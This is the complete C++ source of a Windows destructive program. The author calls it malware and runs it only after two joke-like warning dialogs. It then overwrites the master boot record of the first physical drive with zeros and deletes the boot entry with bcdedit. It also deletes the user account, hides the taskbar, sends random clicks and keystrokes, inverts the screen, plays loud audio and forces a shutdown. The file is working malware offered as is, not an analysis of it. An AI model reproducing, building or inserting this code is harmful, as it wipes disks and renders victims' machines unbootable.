// triqual.cpp : VERY QUICK...
// this is VERY destructive and has NO SAFETY VERSION.
// Use Release x86 configuration to compile or it will not work

#include <Windows.h>
#include <tchar.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	DWORD write;
	HANDLE MBR = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);	
		
	WriteFile(MBR, mbrData, 512, &write, NULL);
	return 1;
}
DWORD WINAPI staticshaker(LPVOID lpvd) {
	HDC hdc;
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		hdc = GetDC(0);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCINVERT);
		Sleep(100);
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI sound1() { //credits to Maxi2022gt/Maxi toys, but I modified it
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 11) * (t * t / 8000000);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI notaskbar(LPVOID lpvd) {
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
DWORD WINAPI click(LPVOID lpParam) {
	while (true) {
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = rand() % w, y = rand() % h;
		SetCursorPos(x, y);
		mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
		Sleep(500);
		keybd_event(16, 0, 0, 0);
		Sleep(500);
		keybd_event(16, 0, KEYEVENTF_KEYUP, 0);
		Sleep(500);
		keybd_event(rand() % 26 + 65, 0, 0, 0);
		Sleep(500);
	}
	return 0;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"yes yes this is malware im too lazy to write something", L"do not run", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"second warning", L"ooo scary glitching text final warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			ShellExecuteA(NULL, "open", "bcdedit", "/delete {current}", NULL, SW_HIDE);
			ShellExecuteA(NULL, "open", "net", "user %username% /delete", NULL, SW_HIDE);
			Sleep(1000);
			CreateThread(0, 0, click, 0, 0, 0);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			Sleep(1000);
			ShellExecuteA(NULL, NULL, "shutdown", "/s", NULL, SW_SHOWDEFAULT);
			HANDLE thread1 = CreateThread(0, 0, staticshaker, 0, 0, 0);
			sound1();
			Sleep(30000);
		}
	}
}
